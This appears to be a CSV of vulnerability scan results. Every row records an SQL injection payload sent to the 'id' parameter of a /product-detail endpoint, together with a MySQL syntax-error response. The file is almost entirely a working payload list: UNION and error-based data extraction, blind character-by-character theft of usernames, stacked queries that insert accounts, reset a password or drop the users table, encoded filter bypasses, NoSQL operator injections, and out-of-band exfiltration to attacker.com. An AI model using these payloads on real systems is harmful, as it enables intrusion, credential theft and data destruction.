SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; WAITFOR DELAY '0:0:5'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' UNION SELECT NULL--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' UNION SELECT NULL,NULL--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' UNION SELECT NULL,NULL,NULL--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' UNION SELECT 1,2,3--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' UNION SELECT user(),database(),version()--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' AND CAST((SELECT version()) AS int)--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' AND 1=CAST((SELECT user) AS int)--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND CONVERT(int, (SELECT @@version))--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND 1=CONVERT(int, (SELECT user_name()))--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; DROP TABLE users--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; DROP TABLE users--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,admin'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,admin' OR '1'='1,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,test' UNION SELECT * FROM users--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')))--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; EXEC xp_dirtree '\\attacker.com\test'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND ASCII(SUBSTR((SELECT user()),1,1))>64--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND ASCII(SUBSTR((SELECT database()),1,1))>64--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND ASCII(SUBSTR((SELECT version()),1,1))>64--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>64--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>64--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a'--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND IF(ASCII(SUBSTR((SELECT user()),1,1))>64,SLEEP(5),0)--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(5),0)--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' AND (CASE WHEN ASCII(SUBSTR((SELECT user),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END)--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1'; IF ASCII(SUBSTRING((SELECT user_name()),1,1))>64 WAITFOR DELAY '00:00:05'--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'/**/OR/**/1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'/**/OR/**/'1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'%09OR%091=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'%0AOR%0A1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR 1=1#,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR 1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR 1=1/*,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,%27 OR %271%27=%271%27--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,%27 OR %271%27=%271%27%23,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1%27%20OR%20%271%27=%271%27--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' Or '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' oR '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR '1'='1'||'1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"1' OR CONCAT('1','=','1')--","<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"{""$ne"": null}","<body><p>error: (1064, 'you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near \"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"{""$gt"": """"}","<body><p>error: (1064, 'you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near \"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"{""$where"": ""this.username == this.password""}","<body><p>error: (1064, 'you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near \"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,"{""username"": {""$regex"": "".*""}, ""password"": {""$regex"": "".*""}}","<body><p>error: (1064, 'you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near \"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,' OR '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,' OR 1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,' OR '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,' OR 1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,' OR '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,' OR 1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
